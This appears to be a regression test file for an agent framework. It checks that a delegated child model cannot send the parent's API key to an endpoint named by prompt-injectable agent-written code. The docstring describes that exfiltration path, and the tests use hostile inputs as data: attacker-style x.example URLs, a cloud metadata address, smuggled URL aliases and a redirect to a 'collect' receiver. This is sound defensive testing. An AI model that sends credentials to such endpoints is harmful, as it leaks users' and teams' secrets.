"""A delegated child's credential follows its endpoint, never the parent's.

`_child_config` copied `provider` / `base_url` from a delegation spec onto a
copy of the parent's `LLMConfig` and kept the parent's resolved `api_key`. A
Python Cell is agent-written (and therefore prompt-injectable) code, and
`host.delegate({"request": ..., "model": {"base_url": ...}})` reached that copy
intact, so one Cell could send the parent's key -- on the Web, the active
profile's key or a team member's own -- to any host it named. The LLM transport
applies no egress allowlist, so nothing downstream stopped it.

The rule now: a child whose `(provider, endpoint)` is its parent's keeps the
parent's credential; a child an override moves takes the credential configured
for where it goes -- a saved profile's, a provider's own endpoint's, the session
owner's own -- and an endpoint nobody configured is refused before any budget is
spent or any request leaves.

Every test is offline. The end-to-end ones replace the transport at
`openai4s.llm._post_json`, the seam every provider request crosses, and assert
on the URL and headers it was handed -- what would have gone on the wire, not
what a config object says. Each refusal has a control that still dispatches.
"""

from __future__ import annotations

import copy
import dataclasses
import json
from http.server import BaseHTTPRequestHandler, HTTPServer
from threading import Thread
from urllib.parse import urlsplit

import pytest

import openai4s.agent.loop as loop_mod
import openai4s.llm as llm_facade
from openai4s.agent.child_model import ChildCredential
from openai4s.agent.delegation import DelegationError, DelegationRunner
from openai4s.agent.loop import Agent
from openai4s.config import Config, LLMConfig, get_config
from openai4s.host.delegation import DelegationService
from openai4s.llm.models import TransportError
from openai4s.llm.registry import register_provider, unregister_provider
from openai4s.llm.transport import post_json
from openai4s.server import gateway as gateway_mod
from openai4s.storage import team as team_mod
from openai4s.storage.user_keys import USER_KEY_SCOPE, secret_name

pytestmark = pytest.mark.stubbed_backend

PARENT_KEY = "synthetic-parent-credential-canary"
PROXY = "https://proxy.lab.example/v1"
PROXY_KEY = "sk-proxy-profile-key"
CLAUDE_ENV_KEY = "sk-claude-environment-key"

_SUBMIT = "```python\nhost.submit_output({'ok': True}, ['Finished the task'])\n```"


# --------------------------------------------------------------------------
# helpers
# --------------------------------------------------------------------------


class _Transport:
    """Records every provider request and answers it from a per-host script."""

    def __init__(self, parent_host: str, parent_script: list[str]) -> None:
        self.parent_host = parent_host
        self.parent_script = list(parent_script)
        self.sent: list[tuple[str, dict, dict]] = []

    def __call__(self, url, payload, headers, timeout, **_context):
        self.sent.append((url, dict(headers), dict(payload)))
        content = _SUBMIT
        if urlsplit(url).hostname == self.parent_host and self.parent_script:
            content = self.parent_script.pop(0)
        if url.endswith("/v1/messages"):
            return {
                "content": [{"type": "text", "text": content}],
                "stop_reason": "end_turn",
                "usage": {},
            }
        return {
            "choices": [{"message": {"content": content}, "finish_reason": "stop"}],
            "usage": {},
        }

    def carrying(self, secret: str) -> list[str]:
        return [
            url
            for url, headers, _payload in self.sent
            if any(secret in str(value) for value in headers.values())
        ]

    def hosts(self) -> list[str]:
        return [urlsplit(url).hostname or "" for url, _h, _p in self.sent]


def _parent_config(**llm) -> Config:
    llm.setdefault("provider", "chatgpt")
    llm.setdefault("api_key", PARENT_KEY)
    return dataclasses.replace(get_config(), llm=LLMConfig(**llm))


def _delegate_cell(model_literal: str) -> str:
    return (
        "```python\n"
        "try:\n"
        "    result = host.delegate({'request': 'child work', "
        f"'model': {model_literal}}})\n"
        "    print('DELEGATED', result.get('stop_reason'))\n"
        "except Exception as error:\n"
        "    print('REFUSED', error)\n"
        "```"
    )


def _run_parent(monkeypatch, tmp_path, cfg: Config, cell: str) -> _Transport:
    monkeypatch.setenv("OPENAI4S_LLM_STREAM", "0")
    transport = _Transport(
        urlsplit(cfg.llm.base_url).hostname or "", [cell, _SUBMIT, _SUBMIT]
    )
    monkeypatch.setattr(llm_facade, "_post_json", transport)
    workspace = tmp_path / "ws"
    workspace.mkdir()
    Agent(cfg=cfg, max_turns=4, verbose=False, workspace=workspace).run(
        "delegate one task"
    )
    return transport


@pytest.fixture()
def child_llm(monkeypatch):
    """Capture the configuration each child Agent is actually built with."""
    seen: list[LLMConfig] = []

    def fake_run(self, task):
        # A copy, not `replace`: that re-runs `__post_init__`, which would
        # refill an empty key from the environment and hide what was built.
        seen.append(copy.copy(self.cfg.llm))
        return {
            "stop_reason": "submitted",
            "submitted_output": {"output": {"ok": True}, "completion_bullets": []},
            "final_message": None,
        }

    monkeypatch.setattr(loop_mod.Agent, "run", fake_run)
    return seen


# --------------------------------------------------------------------------
# End to end: a real kernel, the real Host RPC, only the transport replaced
# --------------------------------------------------------------------------


def test_a_cell_cannot_send_the_parent_key_to_an_endpoint_it_names(
    monkeypatch, tmp_path
):
    """The reported path, measured at the wire.

    Before the fix this sent `Authorization: Bearer <parent key>` to
    `https://x.example/v1/chat/completions`.
    """
    cfg = _parent_config()
    transport = _run_parent(
        monkeypatch,
        tmp_path,
        cfg,
        _delegate_cell("{'base_url': 'https://x.example/v1'}"),
    )

    assert "x.example" not in transport.hosts(), transport.sent
    assert [url for url in transport.carrying(PARENT_KEY) if "x.example" in url] == []
    # The parent itself still ran on its own endpoint under its own key, and
    # the refusal reached the Cell that asked rather than a silent no-op.
    assert transport.carrying(PARENT_KEY)
    assert set(transport.hosts()) == {"api.openai.com"}
    observed = json.dumps([payload for _u, _h, payload in transport.sent])
    assert "REFUSED" in observed and "not a configured model endpoint" in observed


def test_control_a_model_only_override_still_runs_on_the_parent_key(
    monkeypatch, tmp_path
):
    """Changing the model id does not move a child, so nothing is withheld."""
    cfg = _parent_config()
    transport = _run_parent(monkeypatch, tmp_path, cfg, _delegate_cell("'gpt-child'"))

    child = [
        (url, headers)
        for url, headers, payload in transport.sent
        if payload.get("model") == "gpt-child"
    ]
    assert child, transport.sent
    for url, headers in child:
        assert url == "https://api.openai.com/v1/chat/completions"
        assert headers.get("Authorization") == f"Bearer {PARENT_KEY}"


def test_a_keyless_local_child_sends_no_key_at_the_wire(monkeypatch, tmp_path):
    cfg = _parent_config(base_url="http://127.0.0.1:11434/v1")
    cfg.llm.api_key = ""
    transport = _run_parent(monkeypatch, tmp_path, cfg, _delegate_cell("'local-child'"))

    child = [
        (url, headers)
        for url, headers, payload in transport.sent
        if payload.get("model") == "local-child"
    ]
    assert child, transport.sent
    assert all(url == cfg.llm.base_url + "/chat/completions" for url, _ in child)
    assert all("Authorization" not in headers for _url, headers in child)


def test_a_cell_moving_a_child_to_another_provider_sends_that_providers_key(
    monkeypatch, tmp_path
):
    monkeypatch.setenv("OPENAI4S_CLAUDE_API_KEY", CLAUDE_ENV_KEY)
    cfg = _parent_config()
    transport = _run_parent(
        monkeypatch, tmp_path, cfg, _delegate_cell("{'provider': 'claude'}")
    )

    anthropic = [
        headers
        for url, headers, _payload in transport.sent
        if url == "https://api.anthropic.com/v1/messages"
    ]
    assert anthropic, transport.sent
    assert all(headers.get("x-api-key") == CLAUDE_ENV_KEY for headers in anthropic)
    assert transport.carrying(PARENT_KEY)
    assert all(
        url == "https://api.openai.com/v1/chat/completions"
        for url in transport.carrying(PARENT_KEY)
    )


# --------------------------------------------------------------------------
# The runner: admission, the default (environment) owner, keyless parents
# --------------------------------------------------------------------------


def test_an_unconfigured_endpoint_is_refused_before_any_budget_is_spent(child_llm):
    runner = DelegationRunner(_parent_config())
    try:
        with pytest.raises(DelegationError, match="not a configured model endpoint"):
            runner(
                {
                    "request": {
                        "request": "work",
                        "model": {"base_url": "https://x.example/v1"},
                    }
                }
            )
        assert child_llm == []
        assert runner.children() == []
        assert runner.delegation_stats()["spawned_session"] == 0
    finally:
        runner.close()


@pytest.mark.parametrize(
    "spelling",
    [
        "https://api.openai.com/v1/",
        "HTTPS://API.OPENAI.COM/v1",
        "https://api.openai.com:443/v1",
    ],
)
def test_the_parents_own_endpoint_spelled_differently_keeps_its_key(
    child_llm, spelling
):
    runner = DelegationRunner(_parent_config())
    try:
        runner({"request": {"request": "work", "model": {"base_url": spelling}}})
    finally:
        runner.close()
    (seen,) = child_llm
    assert seen.api_key == PARENT_KEY


@pytest.mark.parametrize(
    "base_url",
    [
        "https://api.openai.com/v1?next=https://x.example",
        "https://api.openai.com/v1?",
        "https://api.openai.com/v1#other-path",
        "https://user:password@api.openai.com/v1",
        "https://api.openai.com/v1\n",
        "https://api.openai.com:0/v1",
    ],
)
def test_a_normalized_alias_cannot_change_the_raw_request(child_llm, base_url):
    """Identity drops these parts, but urllib dispatches the raw base URL."""
    runner = DelegationRunner(_parent_config())
    try:
        with pytest.raises(DelegationError, match="child base_url"):
            runner({"request": {"request": "work", "model": {"base_url": base_url}}})
        assert runner.children() == []
        assert runner.delegation_stats()["spawned_session"] == 0
    finally:
        runner.close()
    assert child_llm == []


def test_a_provider_switch_takes_the_new_providers_endpoint_and_key(
    monkeypatch, child_llm
):
    """It used to keep the parent's concrete `base_url` too, so a `claude`
    child talked the Anthropic wire to the OpenAI endpoint under the OpenAI
    key."""
    monkeypatch.setenv("OPENAI4S_CLAUDE_API_KEY", CLAUDE_ENV_KEY)
    runner = DelegationRunner(_parent_config())
    try:
        runner({"request": {"request": "work", "model": {"provider": "claude"}}})
    finally:
        runner.close()
    (seen,) = child_llm
    assert seen.provider == "claude"
    assert seen.base_url == "https://api.anthropic.com"
    assert seen.api_key == CLAUDE_ENV_KEY


def test_a_provider_with_no_credential_of_its_own_is_refused(child_llm):
    """The generic `OPENAI4S_LLM_API_KEY` the suite sets belongs to the
    process's provider; it is not a credential for `claude`."""
    runner = DelegationRunner(_parent_config())
    try:
        with pytest.raises(DelegationError, match="no credential is configured"):
            runner({"request": {"request": "work", "provider": "claude"}})
    finally:
        runner.close()
    assert child_llm == []


def test_two_provider_ids_cannot_share_one_environment_key(monkeypatch, child_llm):
    """Hyphens and underscores collide in shell variable names."""
    monkeypatch.setenv("OPENAI4S_LAB_OPENAI_API_KEY", "synthetic-lab-key")
    register_provider(
        "lab-openai",
        wire="openai",
        base_url="https://a.example/v1",
        model="model-a",
    )
    register_provider(
        "lab_openai",
        wire="openai",
        base_url="https://b.example/v1",
        model="model-b",
    )
    try:
        runner = DelegationRunner(_parent_config())
        try:
            with pytest.raises(DelegationError, match="no credential is configured"):
                runner({"request": {"request": "work", "provider": "lab_openai"}})
        finally:
            runner.close()
        assert child_llm == []
    finally:
        unregister_provider("lab_openai")
        unregister_provider("lab-openai")


def test_a_keyless_local_parents_child_stays_keyless(child_llm):
    """`dataclasses.replace` re-runs `LLMConfig.__post_init__`, which refills an
    empty key from the environment -- the generic cloud key, over plain http to
    the local server."""
    cfg = _parent_config(base_url="http://127.0.0.1:11434/v1")
    cfg.llm.api_key = ""
    runner = DelegationRunner(cfg)
    try:
        runner({"request": {"request": "work", "model": "local-child"}})
    finally:
        runner.close()
    (seen,) = child_llm
    assert seen.base_url == "http://127.0.0.1:11434/v1"
    assert seen.api_key == ""


def test_a_free_form_local_endpoint_is_refused_too(child_llm):
    """Keyless is not the whole risk: a free-form endpoint would also have the
    daemon POST to a host the kernel sandbox keeps the Cell away from."""
    runner = DelegationRunner(_parent_config())
    try:
        with pytest.raises(DelegationError, match="not a configured model endpoint"):
            runner(
                {
                    "request": {
                        "request": "work",
                        "model": {"base_url": "http://169.254.169.254/latest"},
                    }
                }
            )
    finally:
        runner.close()
    assert child_llm == []


def test_a_stored_profile_override_is_held_to_the_same_rule(child_llm):
    """`_with_profile_overrides` carries a profile's `model` onto the spec;
    the stored row is no more trusted with an endpoint than a Cell is."""

    class _Profiles:
        def get_agent(self, name, **_scope):
            return {
                "name": name,
                "system_prompt": "",
                "model": {"base_url": "https://x.example/v1"},
            }

    runner = DelegationRunner(_parent_config())
    service = DelegationService(delegate=runner, steering={}, store=_Profiles())
    try:
        with pytest.raises(DelegationError, match="not a configured model endpoint"):
            service.delegate({"request": "work", "name": "RELAY"})
        assert runner.children() == []
    finally:
        runner.close()
    assert child_llm == []


def test_a_nested_child_is_judged_by_the_trees_owner(monkeypatch, tmp_path):
    """A grandchild's runner is built by the child Agent, which knows nothing of
    the Web owner; it must still find it on the shared tree."""
    asked: list[tuple[str, str]] = []

    def owner(config: LLMConfig):
        asked.append((config.provider, config.base_url))
        if config.base_url == PROXY:
            return ChildCredential(PROXY_KEY, "profile")
        return None

    seen: list[tuple[str, str, str]] = []
    replies = [
        # child turn 1: delegate a grandchild to the configured proxy
        "```python\n"
        f"host.delegate({{'request': 'grandchild', 'model': {{'base_url': {PROXY!r}}}}})\n"
        "```",
    ]

    def scripted(messages, cfg, **_kw):
        seen.append((cfg.base_url, cfg.api_key, cfg.model))
        content = replies.pop(0) if replies else _SUBMIT
        return {
            "content": content,
            "reasoning": None,
            "usage": {},
            "finish_reason": "stop",
            "raw": {},
        }

    monkeypatch.setattr(loop_mod, "chat", scripted)
    workspace = tmp_path / "ws"
    workspace.mkdir()
    runner = DelegationRunner(
        _parent_config(), workspace=workspace, destination_credential=owner
    )
    try:
        result = runner({"request": "delegate deeper"})
    finally:
        runner.close()

    assert result["stop_reason"] == "submitted"
    # Asked at admission and again when the grandchild starts; never about
    # the child, which stayed on its parent's endpoint.
    assert asked and set(asked) == {("chatgpt", PROXY)}
    grandchild = [entry for entry in seen if entry[0] == PROXY]
    assert grandchild and all(key == PROXY_KEY for _u, key, _m in grandchild)
    assert all(key == PARENT_KEY for url, key, _m in seen if url != PROXY)


# --------------------------------------------------------------------------
# The Web owner: model profiles and the session owner's own key
# --------------------------------------------------------------------------


class _Hub:
    def emitter(self, root_frame_id):
        return lambda event: None

    def broadcast(self, root_frame_id, event):
        return None


@pytest.fixture()
def web(tmp_path):
    cfg = Config(
        data_dir=tmp_path / "data",
        llm=LLMConfig(provider="chatgpt", api_key=PARENT_KEY),
        max_turns=2,
    )
    runner = gateway_mod.SessionRunner(cfg, _Hub())
    runner.store.set_model_profiles(
        [
            {
                "id": "mp-proxy",
                "name": "Lab proxy",
                "provider": "chatgpt",
                "base_url": PROXY,
                "model": "proxy-model",
                "api_key": PROXY_KEY,
            }
        ]
    )
    try:
        yield runner
    finally:
        runner.close()


def _web_session(runner):
    frame_id = runner.store.new_frame(kind="turn", project_id="default", status="ready")
    st = runner._state(frame_id, "default")
    runner._ensure_runtime(st)
    assert st.delegation_runner is not None
    return st


def test_web_a_child_moved_to_a_saved_profile_takes_that_profiles_key(web, child_llm):
    st = _web_session(web)
    st.delegation_runner(
        {"request": {"request": "work", "model": {"base_url": PROXY + "/"}}}
    )
    (seen,) = child_llm
    assert seen.base_url == PROXY + "/"
    assert seen.api_key == PROXY_KEY


def test_web_an_endpoint_no_profile_names_is_refused(web, child_llm):
    st = _web_session(web)
    with pytest.raises(DelegationError, match="not a configured model endpoint"):
        st.delegation_runner(
            {
                "request": {
                    "request": "work",
                    "model": {"base_url": "https://x.example/v1"},
                }
            }
        )
    assert child_llm == []


def test_web_the_daemon_key_stays_at_the_daemons_endpoint(tmp_path, child_llm):
    """An active proxy key cannot authorize the official vendor endpoint."""
    cfg = Config(
        data_dir=tmp_path / "data",
        llm=LLMConfig(provider="chatgpt", base_url=PROXY, api_key=PARENT_KEY),
    )
    runner = gateway_mod.SessionRunner(cfg, _Hub())
    try:
        st = _web_session(runner)
        own = runner._child_destination_credential(st)(
            LLMConfig(provider="chatgpt", base_url=PROXY, api_key="unused")
        )
        assert own is not None and own.api_key == PARENT_KEY
        with pytest.raises(DelegationError, match="no credential is configured"):
            st.delegation_runner(
                {
                    "request": {
                        "request": "work",
                        "model": {"base_url": "https://api.openai.com/v1"},
                    }
                }
            )
        assert child_llm == []
    finally:
        runner.close()


def test_web_a_profile_without_its_own_key_cannot_borrow_the_provider_key(
    web, child_llm, monkeypatch
):
    monkeypatch.setenv("OPENAI4S_CHATGPT_API_KEY", "synthetic-official-key")
    monkeypatch.delenv("OPENAI_API_KEY", raising=False)
    web.store.set_model_profiles(
        [
            {
                "id": "mp-proxy",
                "name": "Lab proxy",
                "provider": "chatgpt",
                "base_url": PROXY,
                "model": "proxy-model",
                "api_key": "",
            }
        ]
    )
    st = _web_session(web)
    with pytest.raises(DelegationError, match="no credential is configured"):
        st.delegation_runner(
            {"request": {"request": "work", "model": {"base_url": PROXY}}}
        )
    assert child_llm == []


def test_web_the_rewired_runner_keeps_the_owner(web, child_llm):
    """`_wire_delegation` re-stamps a live runner every turn (its config,
    workspace, sinks); the owner installed when the runner was built must
    survive that, since the re-stamp does not install it again."""
    st = _web_session(web)
    web._wire_delegation(st)
    st.delegation_runner({"request": {"request": "work", "model": {"base_url": PROXY}}})
    (seen,) = child_llm
    assert seen.api_key == PROXY_KEY


@pytest.fixture()
def _fast_pbkdf2(monkeypatch):
    monkeypatch.setattr(team_mod, "PBKDF2_ITERATIONS", 1200)


def _owned_session(runner, username: str, *, claude_key: str | None = None):
    user = runner.store.team.create_user(
        username=username, password=f"fake-pw-{username}", role="member"
    )
    if claude_key is not None:
        ref = runner.store.secrets.put(
            USER_KEY_SCOPE, secret_name(user["id"], "claude"), claude_key
        )
        runner.store.user_keys.set_ref(user["id"], "claude", ref)
    st = _web_session(runner)
    runner.store.team.set_session_owner(st.root_frame_id, user["id"])
    return st


def test_web_a_member_moving_a_child_to_their_provider_uses_their_own_key(
    web, child_llm, monkeypatch, _fast_pbkdf2
):
    """Same answer a turn sent there gets: the member's own key for that
    provider, the group's for everyone else -- and never the parent's."""
    monkeypatch.setenv("OPENAI4S_CLAUDE_API_KEY", CLAUDE_ENV_KEY)
    alice = _owned_session(web, "alice", claude_key="sk-alice-anthropic")
    bob = _owned_session(web, "bob")

    alice.delegation_runner({"request": {"request": "work", "provider": "claude"}})
    bob.delegation_runner({"request": {"request": "work", "provider": "claude"}})

    assert [seen.api_key for seen in child_llm] == [
        "sk-alice-anthropic",
        CLAUDE_ENV_KEY,
    ]


def test_web_a_members_own_key_never_reaches_an_unconfigured_endpoint(
    web, child_llm, _fast_pbkdf2
):
    alice = _owned_session(web, "alice", claude_key="sk-alice-anthropic")
    with pytest.raises(DelegationError, match="not a configured model endpoint"):
        alice.delegation_runner(
            {
                "request": {
                    "request": "work",
                    "model": {
                        "provider": "claude",
                        "base_url": "https://x.example",
                    },
                }
            }
        )
    assert child_llm == []


def test_web_a_members_own_key_is_withheld_from_a_saved_proxy(
    web, child_llm, _fast_pbkdf2
):
    """A profile authorizes its own key, not a team member's provider key."""
    alice = _owned_session(web, "alice")
    owner = web.store.team.session_owner(alice.root_frame_id)
    assert owner is not None
    ref = web.store.secrets.put(
        USER_KEY_SCOPE, secret_name(owner["user_id"], "chatgpt"), "sk-alice-openai"
    )
    web.store.user_keys.set_ref(owner["user_id"], "chatgpt", ref)

    alice.delegation_runner(
        {"request": {"request": "work", "model": {"base_url": PROXY}}}
    )

    (seen,) = child_llm
    assert seen.base_url == PROXY
    assert seen.api_key == PROXY_KEY


def test_llm_transport_does_not_forward_authorization_on_a_redirect():
    """A configured endpoint's 302 must not move a scoped key to its target."""
    received: list[str] = []

    class Receiver(BaseHTTPRequestHandler):
        def do_GET(self):
            received.append(self.headers.get("Authorization", ""))
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"{}")

        def log_message(self, *_args):
            pass

    receiver = HTTPServer(("127.0.0.1", 0), Receiver)

    class Redirector(BaseHTTPRequestHandler):
        def do_POST(self):
            self.rfile.read(int(self.headers["Content-Length"]))
            self.send_response(302)
            self.send_header(
                "Location", f"http://127.0.0.1:{receiver.server_port}/collect"
            )
            self.end_headers()

        def log_message(self, *_args):
            pass

    redirector = HTTPServer(("127.0.0.1", 0), Redirector)
    threads = [
        Thread(target=server.serve_forever, daemon=True)
        for server in (receiver, redirector)
    ]
    for thread in threads:
        thread.start()
    try:
        with pytest.raises(TransportError) as raised:
            post_json(
                f"http://127.0.0.1:{redirector.server_port}/v1",
                {},
                {"Authorization": f"Bearer {PARENT_KEY}"},
                3,
                max_attempts=1,
            )
        assert raised.value.status == 302
        assert received == []
    finally:
        for server in (redirector, receiver):
            server.shutdown()
            server.server_close()
        for thread in threads:
            thread.join(timeout=2)
